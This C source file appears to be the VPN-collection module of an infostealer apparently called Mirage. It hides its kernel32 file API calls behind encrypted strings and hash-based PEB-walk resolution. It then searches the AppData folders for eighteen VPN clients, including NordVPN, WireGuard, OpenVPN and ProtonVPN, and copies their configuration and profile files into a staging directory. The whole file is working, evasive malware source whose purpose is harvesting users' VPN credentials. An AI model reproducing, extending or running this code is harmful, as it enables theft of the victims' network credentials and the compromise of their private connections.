#include "vpn.h"
#include "config.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include <windows.h>

#ifdef ENABLE_VPN_NORDVPN
#include <stdio.h>
#include <string.h>

#define VPN_MAX_PATH 512
#define VPN_MAX_CLIENTS 18

/* PEB-walk API resolution for kernel32 file APIs */
typedef HANDLE (WINAPI *pFFA)(const char *, WIN32_FIND_DATAA *);
typedef BOOL   (WINAPI *pFNA)(HANDLE, WIN32_FIND_DATAA *);
typedef BOOL   (WINAPI *pFC)(HANDLE);
typedef BOOL   (WINAPI *pCFA)(const char *, const char *, BOOL);
typedef BOOL   (WINAPI *pCDA)(const char *, void *);

static struct {
    pFFA pFF; pFNA pFN; pFC pFClose; pCFA pCF; pCDA pCD;
    int  ready;
} vpn_api;

static int vpn_ensure_api(void) {
    if (vpn_api.ready) return 1;
    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;
    char fn[32];
    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
    vpn_api.pFF = (pFFA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
    vpn_api.pFN = (pFNA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
    vpn_api.pFClose = (pFC)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_CopyFileA, ENC_COPYFILEA_LEN, fn);
    vpn_api.pCF = (pCFA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_CreateDirectoryA, ENC_CREATEDIRECTORYA_LEN, fn);
    vpn_api.pCD = (pCDA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    if (!vpn_api.pFF || !vpn_api.pFN || !vpn_api.pFClose ||
        !vpn_api.pCF || !vpn_api.pCD) return 0;
    vpn_api.ready = 1;
    return 1;
}

/* ------------------------------------------------------------------ */
/*  VPN client table (mirrors Mirage vpn.zig)                         */
/* ------------------------------------------------------------------ */

typedef struct {
    const char *name;       /* display name                            */
    const char *subdir;     /* relative dir under base                 */
    const char *ext;        /* file extension filter (NULL = all)      */
    int         use_local;  /* 1 = LOCALAPPDATA, 0 = APPDATA           */
} VpnEntry;

static const VpnEntry vpn_table[VPN_MAX_CLIENTS] = {
    { "NordVPN",                  "NordVPN",                     NULL,    0 },
    { "OpenVPN",                  "OpenVPN Connect\\profiles",   "ovpn",  0 },
    { "WireGuard",                "WireGuard\\Configurations",   "conf",  0 },
    { "SurfShark",                "Surfshark",                   NULL,    1 },
    { "ExpressVPN",               "ExpressVPN",                  NULL,    0 },
    { "CyberGhost",               "CyberGhost",                  NULL,    0 },
    { "PIA",                      "Private Internet Access",     "json",  0 },
    { "Mullvad",                  "Mullvad VPN",                 "json",  0 },
    { "Windscribe",               "Windscribe",                  "cfg",   0 },
    { "TunnelBear",               "TunnelBear",                  NULL,    1 },
    { "Hotspot Shield",           "Hotspot Shield",              "cfg",   1 },
    { "VyprVPN",                  "VyprVPN",                     "dat",   0 },
    { "Hamachi",                  "Hamachi",                     "conf",  0 },
    { "HideMyName",               "Hide My Name",                "xml",   0 },
    { "IPVanish",                 "IPVanish",                    "dat",   0 },
    { "RadminVPN",                "Radmin VPN",                  "xml",   0 },
    { "SoftEther",                "SoftEther VPN Client",        "config", 0 },
    { "ProtonVPN",                "ProtonVPN",                   NULL,    1 },
};

/* ------------------------------------------------------------------ */
/*  Helpers                                                           */
/* ------------------------------------------------------------------ */

static int dir_exists(const char *path) {
    if (!vpn_ensure_api()) return 0;
    char pattern[VPN_MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE hFind;
    int found;

    snprintf(pattern, sizeof(pattern), "%s\\*", path);
    hFind = vpn_api.pFF(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE)
        return 0;
    vpn_api.pFClose(hFind);

    found = 0;
    hFind = vpn_api.pFF(pattern, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                found = 1;
                break;
            }
        } while (vpn_api.pFN(hFind, &fd));
        vpn_api.pFClose(hFind);
    }
    return found;
}

/* Case-insensitive extension match against a filename. */
static int has_ext(const char *filename, const char *ext) {
    const char *dot;
    if (!ext) return 1;  /* no filter — accept everything */
    dot = strrchr(filename, '.');
    if (!dot) return 0;
    dot++;
    return _stricmp(dot, ext) == 0;
}

/* Create directory recursively (single extra level is enough for VPN
   output dirs like "vpn\\NordVPN"). */
static void ensure_dir(const char *path) {
    vpn_api.pCD(path, NULL);
}

/* ------------------------------------------------------------------ */
/*  Core collection logic                                             */
/* ------------------------------------------------------------------ */

/* Copy all matching files from src_dir into dst_dir.  Returns count. */
static int copy_matching_files(const char *src_dir, const char *dst_dir,
                               const char *ext) {
    if (!vpn_ensure_api()) return 0;
    char pattern[VPN_MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE hFind;
    int count = 0;

    snprintf(pattern, sizeof(pattern), "%s\\*", src_dir);
    hFind = vpn_api.pFF(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE)
        return 0;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;
        if (!has_ext(fd.cFileName, ext))
            continue;

        char src_path[VPN_MAX_PATH];
        char dst_path[VPN_MAX_PATH];
        snprintf(src_path, sizeof(src_path), "%s\\%s", src_dir, fd.cFileName);
        snprintf(dst_path, sizeof(dst_path), "%s\\%s", dst_dir, fd.cFileName);

        if (vpn_api.pCF(src_path, dst_path, FALSE))
            count++;
    } while (vpn_api.pFN(hFind, &fd));

    vpn_api.pFClose(hFind);
    return count;
}

int vpn_collect(const char *output_dir) {
    char local[VPN_MAX_PATH];
    char roaming[VPN_MAX_PATH];
    const char *appdata;
    int total = 0;

    if (!output_dir)
        return -1;

    /* Resolve AppData paths.  LOCALAPPDATA is preferred for "local"
       clients, APPDATA for "roaming" clients. */
    appdata = getenv("APPDATA");
    if (appdata)
        snprintf(roaming, sizeof(roaming), "%s", appdata);
    else
        roaming[0] = '\0';

    appdata = getenv("LOCALAPPDATA");
    if (appdata)
        snprintf(local, sizeof(local), "%s", appdata);
    else
        local[0] = '\0';

    /* Base output: <output_dir>\vpn */
    char vpn_base[VPN_MAX_PATH];
    snprintf(vpn_base, sizeof(vpn_base), "%s\\vpn", output_dir);
    ensure_dir(vpn_base);

    for (int i = 0; i < VPN_MAX_CLIENTS; i++) {
        const VpnEntry *e = &vpn_table[i];
        const char *base = e->use_local ? local : roaming;

        if (!base[0])
            continue;

        char src_dir[VPN_MAX_PATH];
        snprintf(src_dir, sizeof(src_dir), "%s\\%s", base, e->subdir);

        if (!dir_exists(src_dir))
            continue;

        /* Create per-client output directory: vpn\NordVPN, vpn\WireGuard, ... */
        char dst_dir[VPN_MAX_PATH];
        snprintf(dst_dir, sizeof(dst_dir), "%s\\%s", vpn_base, e->name);
        ensure_dir(dst_dir);

        total += copy_matching_files(src_dir, dst_dir, e->ext);
    }

    return total;
}

#endif /* ENABLE_VPN_NORDVPN */
